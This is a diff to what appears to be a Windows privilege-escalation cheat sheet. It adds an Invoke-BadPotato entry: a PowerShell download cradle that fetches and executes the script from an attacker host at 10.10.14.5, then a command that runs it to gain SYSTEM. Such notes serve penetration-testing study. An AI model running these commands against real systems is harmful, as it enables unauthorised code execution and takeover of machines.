@@ -104,6 +104,18 @@
 
 ## Link: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
 
+## Tool: Invoke-BadPotato
+
+## Link: https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1
+
+Download the script on our target machine
+
+    iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-BadPotato.ps1')
+
+Run the script to get system
+
+    Invoke-BadPotato -Command "c:\temp\runme.bat"
+
 ## SeDebug Privilege
 
 ### Tools: Meterpreter, https://github.com/decoder-it/psgetsystem
